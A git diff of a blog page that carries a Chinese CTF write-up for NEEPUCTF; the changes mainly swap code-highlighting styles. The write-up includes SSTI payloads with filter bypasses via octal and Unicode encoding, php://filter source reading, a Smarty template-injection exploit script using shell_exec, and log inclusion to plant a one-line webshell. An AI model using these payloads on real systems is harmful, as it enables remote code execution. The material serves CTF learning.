@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      556 字
+      614 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      18
+      10
        分钟
     </span>
   
@@ -245,6 +238,12 @@
             <!-- SEO header -->
             <h1 style="display: none">NEEPUCTF</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h2><p>打开环境    </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/b36aac21b99441e6.png" srcset="/img/loading.gif"></p>
@@ -252,15 +251,15 @@
 <h2 id="The-myth-of-Aladdin"><a href="#The-myth-of-Aladdin" class="headerlink" title="The_myth_of_Aladdin"></a>The_myth_of_Aladdin</h2><p>SSTI<br>过滤了<code>&#123;&#123;&#125;&#125;</code>用<code>&#123;%print()%&#125;</code>替代<br><code>.</code>用<code>[]</code>替换<br>过滤了类名，八进制或者Unicode均可绕过     </p>
 <p>payload：<code>&#123;%print(().__class__.__base__.__subclass__()[95].__init__.__globals__.__builtins__.__import__('os').popen('ls').read())%&#125;</code>   </p>
 <p>转八进制     </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">'read'</span><span class="token punctuation">;</span>
-<span class="token variable">$res</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token variable">$res</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token double-quoted-string string">"\\"</span><span class="token punctuation">.</span><span class="token function">decoct</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></code></pre>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$str=<span class="hljs-string">&#x27;read&#x27;</span>;
+$res=<span class="hljs-string">&#x27;&#x27;</span>;
+<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($str);$i++)
+&#123;
+    $res.=<span class="hljs-string">&quot;\\&quot;</span>.decoct(ord($str[$i]));
+&#125;
+<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;\n&quot;</span>;
+var_dump($res);</code></pre></div></code></pre>
 <p>en-payload:<code>&#123;%print(()["\137\137\143\154\141\163\163\137\137"]["\137\137\142\141\163\145\137\137"]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[95]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]["\137\137\151\155\160\157\162\164\137\137"]("o""s")["\160\157\160\145\156"]("ls")["\162\145\141\144"]())%&#125;</code>     </p>
 <p>空格用<code>%09</code>代替     </p>
 <p>最后读取flag过滤了<code>Neepu</code>，Unicode编码<br><code>cat /flag|base64</code>—&gt;<code>\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u007c\u0062\u0061\u0073\u0065\u0036\u0034</code>     </p>
@@ -270,39 +269,39 @@
 <p>验证码图片的名字就是验证码，可以写脚本跑    </p>
 <p>猜对五次后会进行跳转<br><code>http://neepusec.club:18943/index.php?file=rander.php</code>       </p>
 <p>可以用为协议读取下源码<br><code>?file=php://filter/read=convert.base64-encode/resource=rander.php</code>     </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token comment">// create object</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'smarty/Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Smarty</span><span class="token punctuation">;</span>
-    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'string:恭喜 '</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token single-quoted-string string">' 获得了胜利'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span></code></pre></code></pre>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">// create object</span>
+<span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;num&#x27;</span>] &gt;= <span class="hljs-number">5</span>) &#123;
+    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;smarty/Smarty.class.php&#x27;</span>);
+    $smarty = <span class="hljs-keyword">new</span> Smarty;
+    $name = $_SESSION[<span class="hljs-string">&quot;username&quot;</span>];
+    $smarty-&gt;display(<span class="hljs-string">&#x27;string:恭喜 &#x27;</span>.$name.<span class="hljs-string">&#x27; 获得了胜利&#x27;</span>);
+&#125;</code></pre></div></code></pre>
 <p><code>display</code>存在PHP模板注入     </p>
 <p>名字改成模板注入语句即可<br>这里还有<code>disable_function</code>,可以用<code>shell_exec</code>    </p>
 <p>WP的EXP：        </p>
-<pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
-<span class="token keyword">import</span> requests
+<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> requests
 
-url<span class="token operator">=</span><span class="token string">"http://neepusec.club:18943"</span>
-s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token comment">#payload = "&#123;&#123;shell_exec(\"\ls\t/\")&#125;&#125;'='0"</span>
-payload <span class="token operator">=</span> <span class="token string">"&#123;&#123;shell_exec(\"cat\t/This_is_your_Flag\")&#125;&#125;'='0"</span>
-login_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>
-res0 <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/login.php"</span><span class="token punctuation">,</span>data <span class="token operator">=</span> login_data<span class="token punctuation">)</span>
+url=<span class="hljs-string">&quot;http://neepusec.club:18943&quot;</span>
+s = requests.Session()
+<span class="hljs-comment">#payload = &quot;&#123;&#123;shell_exec(\&quot;\ls\t/\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>
+payload = <span class="hljs-string">&quot;&#123;&#123;shell_exec(\&quot;cat\t/This_is_your_Flag\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>
+login_data = &#123;<span class="hljs-string">&quot;username&quot;</span>:payload&#125;
+res0 = s.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,data = login_data)
 
-res1 <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/index.php"</span><span class="token punctuation">)</span>
-reg <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'pic\/.*?\.jpg'</span><span class="token punctuation">,</span>res1<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"authcode"</span><span class="token punctuation">:</span>reg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"guess"</span><span class="token punctuation">:</span><span class="token string">"on"</span><span class="token punctuation">&#125;</span>
+res1 = s.get(url+<span class="hljs-string">&quot;/index.php&quot;</span>)
+reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res1.text)
+data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;
 
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    res3 <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/index.php"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
-    reg <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'pic\/.*?\.jpg'</span><span class="token punctuation">,</span>res3<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"authcode"</span><span class="token punctuation">:</span>reg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"guess"</span><span class="token punctuation">:</span><span class="token string">"on"</span><span class="token punctuation">&#125;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res3<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">3287</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span>res3<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-        <span class="token keyword">break</span></code></pre></code></pre>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1000</span>):
+    res3 = s.post(url+<span class="hljs-string">&quot;/index.php&quot;</span>,data=data)
+    reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res3.text)
+    data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;
+    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(res3.text)!=<span class="hljs-number">3287</span>):
+        print(i)
+        print(res3.text)
+        <span class="hljs-keyword">break</span></code></pre></div></code></pre>
 <p>另一种方法<a target="_blank" rel="noopener" href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">（日志包含）</a>：<br>日志路径<code>file=/var/log/nginx/access.log</code><br><img src="https://ftp.bmp.ovh/imgs/2021/05/4ad56cf981691d27.png" srcset="/img/loading.gif">       </p>
 <p>写入一句话<br><img src="https://ftp.bmp.ovh/imgs/2021/05/81e22ec2143d5c2f.png" srcset="/img/loading.gif"></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">more</a>     </p>
@@ -442,7 +441,7 @@ data<span class="token operator">=</span><span class="token punctuation">&#123;<
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -468,8 +467,6 @@ data<span class="token operator">=</span><span class="token punctuation">&#123;<
 
 
 
-  
-    
   
 
 
